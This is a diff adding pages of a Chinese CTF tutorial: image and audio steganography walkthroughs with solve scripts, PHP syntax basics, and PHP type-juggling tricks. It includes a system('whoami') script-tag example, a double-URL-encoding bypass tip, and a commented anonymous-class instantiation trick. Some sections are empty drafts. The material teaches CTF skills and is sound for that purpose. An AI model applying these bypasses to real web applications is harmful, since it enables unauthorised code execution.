+    red, green, blue, alpha = j  # 解包 RGBA 值
+
+    print(red, green, blue, alpha)
+
+    if blue == 1:
+        output.putpixel((red, green), (0, 0, 0))  # 黑色
+    else:
+        output.putpixel((red, green), (255, 255, 255))
+
+# 显示和保存新创建的图像
+output.show()
+output.save("out.png")
+</code></pre>
+<p>FLAG：<code>antd3ctf{G1F_0R_C0L0R_0R_QRC0D3_0R_WHAT???}</code></p>
+<h4 id="相关题目"><a class="header" href="#相关题目">相关题目</a></h4>
+<h3 id="考点总结"><a class="header" href="#考点总结">考点总结</a></h3>
+<h2 id="exif"><a class="header" href="#exif">EXIF</a></h2>
+<p><a href="https://zh.wikipedia.org/wiki/Exif">Exif</a>（Exchangeable image file format，可交换图像文件格式）是专门为数码相机的照片设定的文件格式，可以记录数码照片的属性信息和拍摄数据。</p>
+<pre><code class="language-bash"></code></pre>
+<h2 id="lsb隐写"><a class="header" href="#lsb隐写">LSB隐写</a></h2>
+<p>通过修改图像中每个像素的最低有效位（Least Significant Bit，LSB），将秘密数据嵌入到图像中，而不会明显改变图像的视觉外观。</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1300/format:webp/0*MQgIxjo4eKj3b-l6" alt="https://miro.medium.com/v2/resize:fit:1300/format:webp/0*MQgIxjo4eKj3b-l6" />
+<img src="https://miro.medium.com/v2/resize:fit:1400/0*ijRQv5bQj4UZg-V1" alt="" /></p>
+<h3 id="参考资料-1"><a class="header" href="#参考资料-1">参考资料</a></h3>
+<ul>
+<li><a href="https://medium.com/analytics-vidhya/shh-your-secret-is-safe-a-simple-guide-to-steganography-in-python-89116582277e">https://medium.com/analytics-vidhya/shh-your-secret-is-safe-a-simple-guide-to-steganography-in-python-89116582277e</a></li>
+</ul>
+<h2 id="数字水印"><a class="header" href="#数字水印">数字水印</a></h2>
+<p><a href="https://medium.com/@PLZENTERTEXT/wargames-my-2024-forensics-misc-writeup-74375de25de5">https://medium.com/@PLZENTERTEXT/wargames-my-2024-forensics-misc-writeup-74375de25de5</a>
+<a href="https://ctftime.org/writeup/34120">https://ctftime.org/writeup/34120</a></p>
+<h3 id="盲水印"><a class="header" href="#盲水印">盲水印</a></h3>
+<h2 id="隐写检测工具"><a class="header" href="#隐写检测工具">隐写检测工具</a></h2>
+<p><a href="https://github.com/zed-0xff/zsteg">zsteg</a> detect stegano-hidden data in PNG &amp; BMP</p>
+<p><a href="https://web.archive.org/web/20150415213536/http://www.outguess.org/detection.php">stegdetect</a>是一个用来检测<code>JPEG</code>图片是否存在隐藏信息的自动化工具。可检测<code>jsteg</code>、<code>jphide</code>、<code>outguess</code>、<code>F5</code>、<code>、</code></p>
+<p>WbStego</p>
+<p>jphide</p>
+<p><a href="https://github.com/DominicBreuker/stego-toolkit">https://github.com/DominicBreuker/stego-toolkit</a></p>
+<p><a href="https://www.anquanke.com/post/id/189154#h2-7">https://www.anquanke.com/post/id/189154#h2-7</a></p>
+<div class="table-wrapper"><table><thead><tr><th>工具名</th><th>主要功能</th><th>适用场景</th><th>备注</th></tr></thead><tbody>
+<tr><td><strong>zsteg</strong></td><td>针对 PNG 和 BMP 图片的隐写分析</td><td>用于从 PNG、BMP 图片中提取隐藏数据</td><td>支持多种隐写算法，易用且功能强大</td></tr>
+<tr><td><strong>WbStego</strong></td><td>多格式隐写工具</td><td>支持多种图片格式的隐写，界面友好</td><td>兼容多种隐写算法，适合初学者使用</td></tr>
+<tr><td><strong>jphide</strong></td><td>基于 JPEG 文件的隐写</td><td>用于在 JPEG 图片中隐藏和提取数据</td><td>经典 JPEG 隐写工具，命令行操作</td></tr>
+<tr><td><strong>jsteg</strong></td><td>JPEG 隐写，专注单比特隐写</td><td>通过 LSB 技术隐藏数据，支持签名和验证</td><td>轻量且支持密码签名，适合对抗追踪攻击</td></tr>
+<tr><td><strong>Steghide</strong></td><td></td><td></td><td></td></tr>
+</tbody></table>
+</div>
+<p><a href="https://github.com/DominicBreuker/stego-toolkit">https://github.com/DominicBreuker/stego-toolkit</a></p>
+<p><a href="https://github.com/lukechampine/jsteg">jsteg</a></p>
+<p>首先安装 Go 语言环境</p>
+<pre><code class="language-bash">sudo apt update
+sudo apt install golang-go
+</code></pre>
+<p>然后再执行：</p>
+<pre><code class="language-bash">go install lukechampine.com/jsteg@latest
+</code></pre>
+<p><a href="https://georgeom.net/StegOnline/upload">https://georgeom.net/StegOnline/upload</a>
+<a href="http://stylesuxx.github.io/steganography/">http://stylesuxx.github.io/steganography/</a></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="音频隐写"><a class="header" href="#音频隐写">音频隐写</a></h1>
+<p>常见的音频文件类型有<code>MP3</code>和<code>WAV</code>。</p>
+<ul>
+<li>WAV
+<ul>
+<li>是一种无损音频格式，通常使用 PCM（脉冲编码调制）进行编码。</li>
+<li>文件大小较大，因为它包含完整的未压缩音频数据。</li>
+</ul>
+</li>
+<li>MP3
+<ul>
+<li>是一种有损音频格式，通过压缩算法去除人耳不易察觉的音频数据，使文件更小。</li>
+</ul>
+</li>
+<li>FLAC
+Sonic Visualiser</li>
+</ul>
+<p><a href="https://deepsound.en.uptodown.com/windows">https://deepsound.en.uptodown.com/windows</a></p>
+<h2 id="波形图隐写"><a class="header" href="#波形图隐写">波形图隐写</a></h2>
+<h3 id="例题分析sctf-2021in_the_vaporwaves"><a class="header" href="#例题分析sctf-2021in_the_vaporwaves">例题分析：[SCTF 2021]in_the_vaporwaves</a></h3>
+<p>中间部分音频左右声道反相，尝试将左右声道合并。</p>
+<pre><code class="language-python">import wave
+
+output_file = "output.wav"
+
+with wave.open("c.wav", "rb") as wav_file:
+    # 获取音频参数
+    params = wav_file.getparams()
+    num_channels, sample_width, frame_rate, num_frames = params[:4]
+
+    # 输出音频参数
+    print(f"声道数: {num_channels}")
+    print(f"样本宽度: {sample_width} 字节")
+    print(f"采样率: {frame_rate} Hz")
+    print(f"帧数: {num_frames}")
+
+    # 读取所有音频数据
+    audio_data = wav_file.readframes(num_frames)
+
+# 收集所有混合后的采样点
+mixed_data = bytearray()
+
+for i in range(num_frames):
+    # 计算每个采样点的起始位置
+    start = i * num_channels * sample_width
+    # 计算每个采样点的结束位置
+    end = start + sample_width
+
+    # 提取左声道和右声道数据
+    left_channel = audio_data[start:end]
+    right_channel = audio_data[start + sample_width : end + sample_width]
+
+    # 处理单声道文件时，右声道可能不存在
+    if len(right_channel) &lt; sample_width:
+        right_channel = left_channel
+
+    # 将左声道和右声道数据混合为单声道
+    mixed_channel = (
+        int.from_bytes(left_channel, "little", signed=True)
+        + int.from_bytes(right_channel, "little", signed=True)
+    ) // 2
+    # 转回字节
+    mixed_bytes = mixed_channel.to_bytes(sample_width, "little", signed=True)
+    mixed_data.extend(mixed_bytes)
+
+# 写入新的WAV文件
+with wave.open(output_file, "wb") as f:
+    f.setnchannels(1)  # 设置为单声道
+    f.setsampwidth(sample_width)
+    f.setframerate(frame_rate)
+
+    f.writeframes(mixed_data)
+
+print("单声道WAV文件已生成：", output_file)
+</code></pre>
+<p>打开<code>output.wav</code>，提取摩尔斯电码。</p>
+<p><img src="stego/../images/SCTF2021-in-the-vaporwaves-output.png" alt="SCTF2021-in-the-vaporwaves-output" /></p>
+<pre><code>... -.-. - ..-. -.. . ... .---- .-. ...-- ..--.- -.. .-. .. ...- . ... ..--.- .. -. - ----- ..--.- ...- .- .--. --- .-. .-- .--.-. ...- . ...
+</code></pre>
+<p>在<a href="https://gchq.github.io/CyberChef/#recipe=From_Morse_Code(&#x27;Space&#x27;,&#x27;Line%20feed&#x27;)&amp;input=Li4uIC0uLS4gLSAuLi0uIC0uLiAuIC4uLiAuLS0tLSAuLS4gLi4uLS0gLi4tLS4tIC0uLiAuLS4gLi4gLi4uLSAuIC4uLiAuLi0tLi0gLi4gLS4gLSAtLS0tLSAuLi0tLi0gLi4uLSAuLSAuLS0uIC0tLSAuLS4gLi0tIC4tLS4tLiAuLi4tIC4gLi4u">CyberChef</a>上解码即可。</p>
+<p>方法二：</p>
+<ul>
+<li><code>Audacity</code></li>
+</ul>
+<p>点击菜单栏<code>轨道</code>&gt;<code>混音</code>&gt;<code>混合立体声至单声道</code>。</p>
+<p><img src="stego/../images/Audacity-Channels-Mixed.png" alt="Audacity Channels Mixed" /></p>
+<p>合并为单声道，结果如下图所示：</p>
+<p><img src="stego/../images/SCTF2021-in-the-vaporwaves-Audacity-1.png" alt="SCTF2021-in_the_vaporwaves-Audacity" /></p>
+<ul>
+<li><code>Sonic Visualiser</code></li>
+</ul>
+<p>点击菜单栏<code>Layer（图层）</code>&gt;<code>Add Spectrogram（添加频谱图）</code>&gt;<code>All Channels Mixed（所有声道混合）</code>，将所有声道的频谱数据混合成一个单一的频谱图。</p>
+<p><img src="stego/../images/SCTF2021-in-the-vaporwaves-Sonic-Visualiser.png" alt="SCTF2021-in-the-vaporwaves-Sonic-Visualiser" /></p>
+<h2 id="频谱图"><a class="header" href="#频谱图">频谱图</a></h2>
+<h2 id="lsb"><a class="header" href="#lsb">LSB</a></h2>
+<h3 id="mp33stego"><a class="header" href="#mp33stego"><code>MP33stego</code></a></h3>
+<p><a href="https://www.petitcolas.net/steganography/mp3stego/">MP3stego</a></p>
+<h2 id="工具"><a class="header" href="#工具">工具</a></h2>
+<p>[WAV]</p>
+<p>[Steghide]</p>
+<p><a href="https://github.com/danielcardeenas/AudioStego">AudioStego</a></p>
+<ul>
+<li><a href="https://www.audacityteam.org/download/windows/">Audacity</a></li>
+<li><a href="https://www.sonicvisualiser.org/">sonic visualiser</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="视频隐写"><a class="header" href="#视频隐写">视频隐写</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="文档隐写"><a class="header" href="#文档隐写">文档隐写</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="web-安全"><a class="header" href="#web-安全">Web 安全</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="php语法基础"><a class="header" href="#php语法基础">PHP语法基础</a></h1>
+<p>PHP 是一种广泛应用的通用脚本语言，特别适合用于网页开发，其代码可嵌入到 HTML 中。它快速、灵活且实用，易于学习和使用。</p>
+<p>PHP 作为<code>世界上最好的语言</code>，是 CTF Web 题目中的考查热点。</p>
+<p>历史主流版本有<code>5.[56].x</code>、<code>7.[01234].x</code>和<code>8.[01234].x</code>。</p>
+<h2 id="环境搭建"><a class="header" href="#环境搭建">环境搭建</a></h2>
+<p>参考<code>WAMP</code>和<code>LAMP</code>部分。</p>
+<h2 id="变量基础"><a class="header" href="#变量基础"><a href="https://www.php.net/manual/zh/language.variables.basics.php">变量基础</a></a></h2>
+<p>PHP 中的变量以美元符号<code>$</code>开头，后接变量名，且变量名<strong>区分大小写</strong>。</p>
+<p>有效的变量名必须以<strong>字母</strong>或下划线开头，后面可以跟上任意数量的字母，数字或下划线。其正则表达式为<code>^[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff]*$</code>。</p>
+<p>!&gt; 所指的字母包括<code>a-z</code>，<code>A-Z</code>，以及 ASCII 字符从 128 到 255（0x80-0xff）。正则表达式显示，变量名支持 Unicode、中文，例如<code>$你好</code></p>
+<ul>
+<li>有效变量名</li>
+</ul>
+<pre><code class="language-php">&lt;?php
+$var = 'Bob'; // 将字符串 'Bob' 赋值给变量 $var
+$Var = 'Joe';
+echo "$var, $Var"; // 输出 "Bob, Joe"
+
+$_4site = 'not yet'; // 合法变量名；以下划线开头
+$i站点is = 'mansikka'; // 合法变量名；可以用中文
+?&gt;
+</code></pre>
+<ul>
+<li>无效变量名</li>
+</ul>
+<pre><code class="language-php">&lt;?php
+$4site = 'not yet';     // 非法变量名；以数字开头
+</code></pre>
+<h2 id="基本语法"><a class="header" href="#基本语法">基本语法</a></h2>
+<h3 id="php标记"><a class="header" href="#php标记">PHP标记</a></h3>
+<p>当解析一个文件时，PHP 会寻找<code>起始和结束标记</code>，也就是<code>&lt;?php</code>和<code>?&gt;</code>，这告诉 PHP 开始和停止解析二者之间的代码。<strong>此种解析方式使得 PHP 可以被嵌入到各种不同的文档中去</strong>，而任何起始和结束标记之外的部分都会被 PHP 解析器忽略。</p>
+<ul>
+<li>普通标记<code>&lt;?php ?&gt;</code></li>
+<li>短标记<code>&lt;? ?&gt;</code>
+<ul>
+<li>短标记是被默认开启的，但是也可以通过设置<code>short_open_tag</code>来禁用</li>
+</ul>
+</li>
+<li><code>&lt;?=</code>
+<ul>
+<li><code>&lt;?php echo</code>的简写形式，不受<code>short_open_tag</code> 控制</li>
+</ul>
+</li>
+<li>ASP 风格标记<code>&lt;% %&gt;</code> 、<code>&lt;%=</code>
+<ul>
+<li>自 PHP 7.0.0 起 ，被移除</li>
+<li>默认关闭，须将<code>asp_tags</code>设置为 On</li>
+</ul>
+</li>
+<li>脚本标记 <code>&lt;script language="php"&gt;</code>
+<ul>
+<li>自 PHP 7.0.0 起，被移除</li>
+<li>eg. <code>&lt;script language="php"&gt;system("whoami"); &lt;/script&gt;</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="指令分隔符"><a class="header" href="#指令分隔符">指令分隔符</a></h3>
+<p>PHP 每个语句后需用<code>分号</code>结束指令，结束标记隐含表示了一个分号，代码段的最后一行可以不加分号。</p>
+<p>在文件末尾，PHP 代码段的结束标记可以省略，尤其在使用 include 或者 require 时，这样可以避免不必要的空白符出现。</p>
+<h3 id="注释"><a class="header" href="#注释">注释</a></h3>
+<p>PHP 支持 C，C++ 和 Unix Shell 风格（Perl 风格）的注释。</p>
+<pre><code class="language-php">&lt;?php
+    echo 'This is a test'; // 这是一个单行注释, c++ 样式注释
+    /* 这是一条多行注释
+       另一行也是注释 */
+    echo 'This is yet another test';
+    echo 'One Final Test'; # 这是另一个单行注释, shell 风格的注释
+?&gt;
+</code></pre>
+<h2 id="如何运行php代码"><a class="header" href="#如何运行php代码">如何运行PHP代码？</a></h2>
+<ul>
+<li>通过网站运行</li>
+</ul>
+<p>将 PHP 代码文件放在支持 PHP 的 Web 服务器（如 Apache、Ngnix）网站目录下，通过浏览器访问该文件即可运行。</p>
+<ul>
+<li>命令行模式运行</li>
+</ul>
+<p>在终端或命令行中执行以下命令来运行 PHP 代码：</p>
+<blockquote>
+<p>若使用 PHP Study，需设置环境变量，或在 PHP 可执行程序目录下运行。</p>
+</blockquote>
+<pre><code class="language-bash"># 交互模式
+php -a
+
+# 执行代码，不包括标记
+php -r &lt;code&gt;
+
+# 执行指定的 PHP 文件
+php -f scriptname.php
+</code></pre>
+<ul>
+<li>在线 PHP 代码测试编辑器</li>
+</ul>
+<blockquote>
+<p><strong>强烈推荐</strong>使用在线 PHP 代码测试编辑器<a href="https://onlinephp.io/">onlinephp.io</a>，该工具提供多种 PHP 版本的选择。</p>
+</blockquote>
+<h2 id="类型"><a class="header" href="#类型">类型</a></h2>
+<p>PHP 支持四种标量值（标量值不能拆分为更小的单元，例如，和数组不同）类型：int 值、浮点数值（float）、string 值和 bool 值。PHP 也支持两种复合类型：数组和对象。这些值类型可以赋值给变量或者从函数返回。</p>
+<h3 id="integer-整型"><a class="header" href="#integer-整型">Integer 整型</a></h3>
+<p>可以使用十进制，<strong>十六进制</strong>，八进制或二进制表示，前面可以加上可选的符号（<code>-</code> 或者 <code>+</code>）。</p>
+<ul>
+<li>要使用<strong>八进制</strong>表达，数字前必须加上<code>0</code>（零）。 PHP 8.1.0 起，八进制表达也可以在前面加上<code>0o</code>或者<code>0O</code>。</li>
+<li>要使用<strong>十六进制</strong>表达，数字前必须加上<code>0x</code>。</li>
+<li>要使用<strong>二进制</strong>表达，数字前必须加上<code>0b</code>。</li>
+</ul>
+<pre><code class="language-php">&lt;?php
+$a = 1234; // 十进制数
+$a = 0123; // 八进制数 (等于十进制 83)
+$a = 0o123; // 八进制数 (PHP 8.1.0 起)
+$a = 0x1A; // 十六进制数 (等于十进制 26)
+$a = 0b11111111; // 二进制数字 (等于十进制 255)
+$a = 1_234_567; // 整型数值 (PHP 7.4.0 以后)
+?&gt;
+</code></pre>
+<h3 id="float-浮点型"><a class="header" href="#float-浮点型">Float 浮点型</a></h3>
+<p>浮点型（也叫浮点数 float，双精度数 double 或实数 real）用于表示小数，常用于需要高精度的小数计算和科学计算等场景。</p>
+<p>?&gt; <strong>科学计数法</strong>使用小写<code>e</code>或大写<code>E</code>均可。</p>
+<pre><code class="language-php">&lt;?php
+$a = 1.234; 
+$b = 1.2e3; // 科学计数法
+$c = 7E-10; // 科学计数法
+$d = 1_234.567; // 从 PHP 7.4.0 开始支持
+?&gt;
+</code></pre>
+<h3 id="string-字符串"><a class="header" href="#string-字符串">String 字符串</a></h3>
+<p>一个字符串是由一系列的字符组成，其中每个字符等同于一个字节。常用单引号和双引号定义字符串。</p>
+<p>?&gt; 用双引号定义的字符串支持<strong>变量解析</strong>，遇到一个美元符号（$），后面的字符会被解释为变量名，然后替换为变量的值。</p>
+<pre><code class="language-php">&lt;?php
+$juice = "apple";
+
+echo "He drank some $juice juice." . PHP_EOL;
+// He drank some apple juice.
+</code></pre>
+<h4 id="数字字符串"><a class="header" href="#数字字符串">数字字符串</a></h4>
+<p>如果一个字符串可以被解释为<code>int</code>或 <code>float</code>类型，则它被视为<code>数字字符串</code>。</p>
+<pre><code class="language-php">&lt;?php
+var_dump(is_numeric('1234')); // bool(true)
+var_dump(is_numeric('0123')); // bool(true)
+var_dump(is_numeric('1.234')); // bool(true)
+var_dump(is_numeric('1.2e3')); // bool(true)
+</code></pre>
+<h4 id="前导数字字符串"><a class="header" href="#前导数字字符串">前导数字字符串</a></h4>
+<p>其开头类似于数字字符串，后跟任何字符，如<code>123a</code>。</p>
+<pre><code class="language-php">&lt;?php
+var_dump(is_numeric('123a')); // bool(false)
+var_dump(is_numeric('123e')); // bool(false)
+</code></pre>
+<p>?&gt; <code>前导数字字符串</code>只是一个字符串，不是数字字符串。</p>
+<h3 id="boolean-布尔类型"><a class="header" href="#boolean-布尔类型">Boolean 布尔类型</a></h3>
+<p><code>bool</code>仅有两个值，用于表达真（truth）值，使用常量<code>true</code> 或 <code>false</code>表示。两个都不区分大小写。</p>
+<pre><code class="language-php">$foo = True; // 将变量 $foo 赋值为 TRUE
+$bar = false; // 将变量 $bar 赋值为 FALSE
+</code></pre>
+<h3 id="null"><a class="header" href="#null">NULL</a></h3>
+<p><code>null</code>类型只有一个值，就是不区分大小写的常量<code>null</code>，未定义和<code>unset()</code>的变量都将解析为值<code>null</code>。</p>
+<pre><code class="language-php">$var = NULL; 
+</code></pre>
+<h3 id="array-数组"><a class="header" href="#array-数组">Array 数组</a></h3>
+<p>数组实际上是键值对。</p>
+<pre><code class="language-php">&lt;?php
+$array1 = array(
+    "foo" =&gt; "bar",
+    "bar" =&gt; "foo",
+);
+
+// 使用短数组语法
+$array2 = [
+    "foo" =&gt; "bar",
+    "bar" =&gt; "foo",
+];
+
+// 没有键名的索引数组
+$array3 = array("foo", "bar", "hello", "world");
+$array4 = ["foo", "bar", "hello", "world"];
+
+// 用方括号`[]`访问数组
+// 应在用字符串表示的数组索引上加上引号，单引号、双引号均可
+var_dump($array1['foo']); // string(3) "bar"
+var_dump($array2["foo"]); // string(3) "bar"
+
+/* 尽管错误，但仍能正常运行。未定义的常量 foo。
+   将未定义的常量当作裸字符串。从 PHP 7.2.0 起已废弃，并触发 E_WARNING 级别错误。 从 PHP 8.0.0 起被移除，并触发 Error 异常。*/
+var_dump($array2[foo]); // string(3) "bar"
+
+var_dump($array3[0]); // string(3) "foo"
+
+/* 在 PHP 8.0.0 之前，方括号和花括号可以互换使用来访问数组单元。
+   花括号语法在 PHP 7.4.0 中已弃用，在 PHP 8.0.0 中不再支持。*/
+var_dump($array4{0}); // string(3) "foo"
+</code></pre>
+<ul>
+<li>从 PHP 7.1.O 起，支持<code>[]</code>数组解包，<code>[$foo, $bar, $baz] = $source_array;</code></li>
+</ul>
+<h2 id="超全局变量"><a class="header" href="#超全局变量">超全局变量</a></h2>
+<p>预定义变量。
+超全局变量是指在全部作用域中始终可用的内置变量。</p>
+<h3 id="_get"><a class="header" href="#_get">$_GET</a></h3>
+<p><code>$_GET</code>通过 URL 参数（又叫 query string）传递给当前脚本的变量的<strong>数组</strong>。</p>
+<ul>
+<li><code>$_GET</code>、 <code>$_POST</code>是通过 <strong>urldecode()</strong> 传递的，<code>urldecode($_POST['id'])</code>，可通过双重 URL 编码绕过。
+<ul>
+<li>URL 解码<a href="https://www.php.net/manual/zh/function.urldecode.php">urldecode()</a> 加号（'+'）被解码成一个空格字符。</li>
+</ul>
+</li>
+<li>若 URL 中的查询字符串<code>?arg=a</code>，则<code>$_GET['arg']</code>为字符串类型；若 URL 中的查询字符串<code>?arg[a]=a</code>，则<code>$_GET['arg']</code>为数组类型。
+<ul>
+<li><code>?arg[]=a&amp;arg[]=b</code>，不指定 key，自动索引递增</li>
+<li><code>?arg[name]=a&amp;arg[name2]=b</code>，指定数组 key，<strong>不需要加引号</strong></li>
+</ul>
+</li>
+<li><code>$_GET</code>，该数组不仅仅对 method 为 GET 的请求生效，而是会针对<strong>所有带 query string 的请求</strong>。</li>
+</ul>
+<h2 id="常量"><a class="header" href="#常量">常量</a></h2>
+<p>可以使用 const 关键字或 define() 函数两种方法来定义一个常量。一个常量一旦被定义，就不能再改变或者取消定义。常量前面没有美元符号（$）；</p>
+<pre><code class="language-php">&lt;?php
+// 简单的标量值
+const CONSTANT = 'Hello World';
+
+echo CONSTANT;
+</code></pre>
+<p>在 PHP 8.0.0 之前，调用未定义的常量会被解释为一个该常量的字符串，即（CONSTANT 对应 "CONSTANT"）。 此方法已在 PHP 7.2.0 中被废弃，会抛出一个 E_WARNING 级错误。
+参见手册中为什么 $foo[bar]是错误的（除非 bar 是一个常量）。</p>
+<h3 id="预定义常量"><a class="header" href="#预定义常量">预定义常量</a></h3>
+<p>内核预定义常量在 PHP 的内核中定义。它包含 PHP、Zend 引擎和 SAPI 模块。比如<code>PHP_EOL</code>为当前平台中对换行符的定义。</p>
+<h3 id="魔术常量"><a class="header" href="#魔术常量">魔术常量</a></h3>
+<p>有九个魔术常量它们的值随着它们在代码中的位置改变而改变。例如 <code>__LINE__</code> 的值就依赖于它在脚本中所处的行来决定。“魔术”常量都在编译时解析，而常规常量则在运行时解析。这些特殊的常量不区分大小写。</p>
+<h2 id="表达式"><a class="header" href="#表达式">表达式</a></h2>
+<h2 id="函数"><a class="header" href="#函数">函数</a></h2>
+<pre><code class="language-php">&lt;?php
+// 定义函数 foo()
+function foo($arg_1, $arg_2, /* ..., */ $arg_n)
+{
+    echo "Example function.\n";
+    return $retval;
+}
+
+// 调用函数 foo()
+foo();
+?&gt;
+</code></pre>
+<p>函数无需在调用之前被定义，但是当一个函数是有条件被定义时，必须在调用函数之前定义。</p>
+<h3 id="可变函数"><a class="header" href="#可变函数">可变函数</a></h3>
+<p>如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。也称为<strong>动态函数</strong>。</p>
+<pre><code class="language-php">&lt;?php
+function foo() {
+    echo "In foo()&lt;br /&gt;\n";
+}
+
+function bar($arg = '')
+{
+    echo "In bar(); argument was '$arg'.&lt;br /&gt;\n";
+}
+
+$func = 'foo';
+$func();        // 调用 foo()
+
+$func = 'bar';
+$func('test');  // 调用 bar()
+</code></pre>
+<p>PHP7 前是不允许用<code>($a)();</code>这样的方法来执行动态函数的，但 PHP7 中增加了对此的支持。所以，我们可以通过<code>('phpinfo')();</code>来执行函数，第一个括号中可以是任意 PHP 表达式。</p>
+<!--  
+## 类与对象
+
+### 匿名类
+
+PHP7 现在支持通过 new class 来实例化匿名类，这可以用来替代一些“用后即焚”的完整类定义。匿名类很有用，可以创建一次性的简单对象。匿名类的名称是通过引擎赋予的。匿名类的名称在不同版本存在差异。
+
+```php
+<?php
+echo get_class(new class() {} );
+// PHP 7.4 
+// class@anonymous%00/var/www/html/index.php:2$1
+
+// PHP 7.[0123]
+// class@anonymous%00/var/www/html/index.php0x7fb985e59023
+```
+
+在 PHP 7.4 中，匿名类的名称与之前版本有所不同，`class@anonymous%00/var/www/html/index.php:2$1`，包含有脚本名称、匿名类所在的行号`:2`、序号`$1`。在实际测试中发现，每次会话其序号从`$0`递增。
+
+我们可以用过引用匿名类的名称实例化。
+
+```php
+<?php
+$a = new class {
+    function getflag() {
+        echo "flag{}";
+    }
+};
+
+$b = $_GET['b'];
+$c = new $b();
+$c->getflag();
+
+// ?b=class@anonymous%00/var/www/html/1.php:2$0
+```
+--><div style="break-before: page; page-break-before: always;"></div><h1 id="php特性"><a class="header" href="#php特性">PHP特性</a></h1>
+<h2 id="类型转换"><a class="header" href="#类型转换">类型转换</a></h2>
+<p>PHP 是<strong>动态类型</strong>语言，声明变量时不需要定义类型。变量类型转换分为<code>自动类型转换</code>和<code>强制类型转换</code>。</p>
+<ul>
+<li>
+<p><code>强制类型转换</code>，通过显式调用进行转换</p>
+<ul>
+<li>通过在值前面的括号中写入类型来将值转换指定的类型，如<code>$bar = (bool) $foo</code>。</li>
+<li>使用<code>settype()</code>函数。</li>
+</ul>
+</li>
+<li>
+<p><code>自动类型转换</code>，PHP 会尝试在某些上下文中自动将值解释为另一种类型，<a href="https://www.php.net/manual/zh/language.types.type-juggling.php">类型转换的判别</a></p>
+</li>
+</ul>
+<h3 id="转换为整型"><a class="header" href="#转换为整型">转换为整型</a></h3>
+<pre><code class="language-php">&lt;?php
+var_dump(intval(false)); // int(0)
+var_dump(intval(true)); // int(1)
+
+var_dump(intval("NULL")); // int(0)
+
+var_dump(intval("123")); // int(123)
+var_dump(intval("0a")); // int(0)
+var_dump(intval("123a")); // int(123)
+var_dump(intval("php")); // int(0)
+
+// PHP 7.1.0，科学计数法
+var_dump(intval("1e1")); // int(1)，从PHP 7.1.0 开始，int(10)
+
+// PHP 8.0.0 之后
+var_dump(intval(NAN)); // int(0)
+var_dump(intval(INF)); // int(0)
+var_dump(intval(-INF)); // int(0)
+</code></pre>
+<h3 id="转换为string"><a class="header" href="#转换为string"><a href="https://www.php.net/manual/zh/language.types.string.php#language.types.string.casting">转换为string</a></a></h3>
+<ul>
+<li>布尔值<code>true</code>转换为"1"</li>
+<li>布尔值<code>false</code>转换为""（空字符串）</li>
+<li>数组<code>array</code>总是转换成字符串"Array"
+<ul>
+<li><code>echo</code>和<code>print</code>无法显示该数组的内容</li>
+<li>在反序列化 POP 链经常用到</li>
+</ul>
+</li>
+<li>整数、浮点数转换为数字的字面样式的字符串</li>
+<li>必须使用魔术方法 <code>__toString</code> 才能将 <code>object</code> 转换为 <code>string</code></li>
+<li><code>null</code>总是被转变成空字符串</li>
+</ul>
+<pre><code class="language-php">// 布尔值`true`转换为"1"
+var_dump(strval(true)); //string(1) "1"
+var_dump(strval(false)); //string(0) ""
+var_dump(strval([])); //string(5) "Array"
+var_dump(strval(123)); //string(3) 
+var_dump(strval(123.5)); //"123"string(5) "123.5"
+var_dump(strval(1e2)); //string(3) "100"
+var_dump(strval(null)); // string(0) ""
+</code></pre>
+<h3 id="转换为布尔值"><a class="header" href="#转换为布尔值"><a href="https://www.php.net/manual/zh/language.types.boolean.php#language.types.boolean.casting">转换为布尔值</a></a></h3>
+<p>当转换为<code>bool</code>时，以下值被认为是<code>false</code>：</p>
+<ul>
+<li>布尔值<code>false</code>本身</li>
+<li>整型值<code>0</code>（零）</li>
+<li>浮点型值 <code>0.0</code></li>
+<li>空字符串 ""，以及字符串 "0"</li>
+<li>不包括任何元素的数组</li>
+<li>原子类型 NULL（包括尚未赋值的变量）</li>
+<li>内部对象的强制转换行为重载为 bool。例如：由不带属性的空元素创建的 SimpleXML 对象。</li>
+</ul>
+<pre><code class="language-php">&lt;?php
+// bool(false)
+var_dump((bool)false);
+var_dump((bool)0);
+var_dump((bool)0.0);
+var_dump((bool)"");
+var_dump((bool)"0");
+var_dump((bool)[]);
+var_dump((bool)null);
+</code></pre>
+<p>所有其它值都被认为是 true（包括 资源 和 NAN）。</p>
+<h2 id="类型比较"><a class="header" href="#类型比较">类型比较</a></h2>
+<p>不同类型的变量在进行松散比较时会进行<code>自动类型转换</code>，<a href="https://www.php.net/manual/zh/language.operators.comparison.php">比较运算符</a></p>
+<ul>
+<li>
+<p><a href="https://www.php.net/manual/zh/types.comparisons.php">PHP类型比较表</a></p>
+</li>
+<li>
+<p>当两个操作对象都是<code>数字字符串</code>，或一个是数字另一个是<code>数字字符串</code>，就会<strong>自动按照数值</strong>进行比较。此规则也适用于<code>switch</code>语句。当比较时用的是 <code>===</code> 或 <code>!==</code>， 则不会进行类型转换——因为不仅要对比数值，还要对比类型。</p>
+</li>
+</ul>
+<blockquote>
+<p>PHP 8.0.0 之前，如果字符串与数字<del>或数字字符串</del>进行比较，则在比较前会将字符串转换为数字。</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+var_dump("0" == 0); // bool(true)
+var_dump("123" == 123); // bool(true)
+var_dump("1e1" == 1e1); // bool(true)
+
+var_dump("0a" == 0); // bool(true)
+var_dump("php" == 0); // bool(true)
+
+// PHP 8.0.0 之后
+var_dump("0a" == 0); // bool(false)
+var_dump("php" == 0); // bool(false)
+</code></pre>
+<h3 id="例题分析-4"><a class="header" href="#例题分析-4">例题分析</a></h3>
+<h4 id="例题1-1"><a class="header" href="#例题1-1">例题1</a></h4>
+<pre><code class="language-php">&lt;?php
+$num = $_GET['num'];
+
+if ($num == 0 &amp;&amp; $num) {
+    echo 'flag{**********}';
+}
+</code></pre>
+<p>当条件 1<code>$num == 0</code>和条件 2<code>$num</code>均为<code>bool(true)</code>时，得到<code>flag</code>。</p>
+<ul>
